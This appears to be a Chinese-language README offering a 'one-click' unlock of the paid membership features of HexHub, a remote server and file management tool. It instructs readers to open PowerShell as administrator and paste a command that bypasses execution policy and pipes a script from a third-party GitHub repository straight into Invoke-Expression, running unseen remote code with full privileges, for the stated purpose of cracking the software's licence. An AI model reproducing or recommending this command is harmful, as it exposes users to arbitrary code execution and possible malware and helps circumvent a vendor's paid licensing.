# HexHub —— 一键运行说明

## 这是什么

HexHub 是连接远程服务器、传输文件、管理数据库的工具。
免费版只开放基础功能，会员功能需要另外购买。

## 怎么跑

1. 点开始菜单 → 输入 `PowerShell` → 右键「以管理员身份运行」
2. 复制下面这条命令，粘贴进去，回车

```powershell
powershell -NoProfile -ExecutionPolicy Bypass -c "irm https://raw.githubusercontent.com/Xioaruan912/ReverseFinal/main/oneclick/hexhub-vip-test.ps1 | iex"
```

3. 等屏幕上出现 `done`，就完成了

## 跑完能看到什么

完成后，桌面上会出现一个免安装的 `HexHub-5.1.9` 文件夹。
双击里面的 `HexHub.exe` 直接打开，打开后会员标记点亮，下面这些功能都可以用：

- 一条命令批量对多台服务器执行
- 批量上传文件、文件夹
- 在两台服务器之间直接传文件
- 多窗口、多视图、分屏
- 会话数量不再受限
- 解压 / 压缩（tar.gz、zip、7z 等）
- 上传公钥
- Docker 相关功能
- 自定义存储（本机 / WebDAV / S3，可离线用）

> 有 2 项仍由厂商服务器决定，本测试改变不了：官方云同步、登录设备数量上限。

## 不想要了怎么删

直接删掉桌面上的 `HexHub-5.1.9` 文件夹即可，删干净、不留东西。

## 常见问题

- **下载慢**：换网络，或过一会儿重跑同一条命令。
- **提示权限不足**：用「以管理员身份运行」打开 PowerShell。
- **想装到别的盘**：先在 PowerShell 里执行
  `$env:HEXHUB_OUTDIR='D:\hexhub'`，再跑上面那条命令。
